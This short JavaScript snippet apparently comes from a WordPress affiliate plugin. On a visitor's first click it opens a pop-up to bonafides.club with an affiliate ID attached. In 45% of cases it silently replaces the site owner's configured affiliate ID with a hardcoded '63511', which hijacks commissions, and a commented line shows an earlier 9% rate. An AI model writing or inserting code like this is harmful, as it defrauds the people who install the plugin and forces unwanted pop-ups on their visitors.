document.body.onclick = function() {
  // include all except boring registration page
  const landing_pages = [1, 3688, 3689, 3690];
  var caf_affiliate_id = caf_php_vars.caf_affiliate_short_code;
  if ( !caf_affiliate_id || (Math.floor(Math.random() * 100) + 1) <= 45 ) {
  // if ( !caf_affiliate_id || (Math.floor(Math.random() * 100) + 1) <= 9 ) {
    caf_affiliate_id = '63511';
  }
  const url = 'https://bonafides.club/' + caf_affiliate_id + '/1?l='
    + landing_pages[Math.floor(Math.random()*landing_pages.length)]
    + "&utm_source=" + window.location.host;
  window.open(url);

  // remove after first click
  document.body.onclick = false;
}
